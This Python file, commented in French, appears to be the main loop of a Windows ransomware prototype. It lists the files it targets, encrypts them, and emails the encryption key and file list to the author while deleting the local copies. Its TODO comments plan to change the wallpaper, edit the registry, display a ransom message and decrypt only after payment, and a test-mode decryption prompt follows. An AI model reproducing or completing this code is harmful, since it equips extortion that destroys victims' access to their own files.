# coding=utf-8

import platform
import Chiffrement
import SendMail

#-----------------------------------------------------------------------------------------------------------
# Boucle principale
#-----------------------------------------------------------------------------------------------------------

# Variables
osName = ' '
listeFichiers = []
listeProteges = []
clef = ' '

# si os = Windows seulement
#--------------------------

osName = platform.system()
if osName != 'Windows':
    exit
else:
    listeFichiers = Chiffrement.F_listeFichiers()                           # je récupère la liste des fichiers à crypter

   # S'il y a des fichiers dans ce dossier, sinon on sort
    if len(listeFichiers) !=0:
        clef = Chiffrement.F_chiffrement(listeFichiers, listeProteges)      # je les chiffre
        SendMail.F_SendMail()                                               # je m'envoie par mail la clef et la liste  et je supprime les deux .txt

        # TODO optimiser os.walk pour diminuer le temps si c:\Users (17 min pour 4472 fichiers 1.8 Go)
        # TODO je change le fond d'écran
        # TODO regedit ?
        # TODO j'affiche le message de rançon
        # TODO je ne décrypte que si j'ai payé et récupéré la clef
    else:
        exit

#-----------------------------
# Pour les tests je décrypte
#-----------------------------

reponse = ' '
clef = ' '
j = 0
# fichier = 'C:\Users\Admin\Desktop\Test P1\*'

while j == 0:
    # attention raw_input sur python 2.7
    reponse = input('Voulez-vous déchiffrer le dossier/fichier (Y/N) ? : ')

    if reponse in ["Y", "y"]:
        # attention raw_input sur python 2.7
        clef = input('Veuillez renseigner la clef de chiffrement : ')

        if clef != ' ':
            Chiffrement.F_dechiffrement(listeFichiers, clef)
            j = 2
        else:
            pass
    elif reponse in ["N", "n"]:
        j = 1
        break
    else:
        print("Y ou N")
        pass

